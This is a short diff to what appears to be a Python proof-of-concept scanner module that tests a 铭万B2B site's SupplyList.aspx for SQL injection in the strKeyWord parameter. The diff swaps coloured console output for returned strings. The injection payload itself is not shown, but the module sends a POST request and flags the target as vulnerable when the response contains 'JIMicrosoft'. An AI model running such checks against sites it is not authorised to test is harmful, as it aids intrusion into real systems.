@@ -9,8 +9,8 @@ description: 文件SupplyList.aspx中,参数strKeyWord存在SQL注入。
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class mainone_SupplyList_sqli_BaseVerify:
     def __init__(self, url):
@@ -28,12 +28,12 @@ class mainone_SupplyList_sqli_BaseVerify:
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"JIMicrosoft" in req.text:
-                cprint("[+]存在铭万B2B SupplyList SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                return "[+]存在铭万B2B SupplyList SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = mainone_SupplyList_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
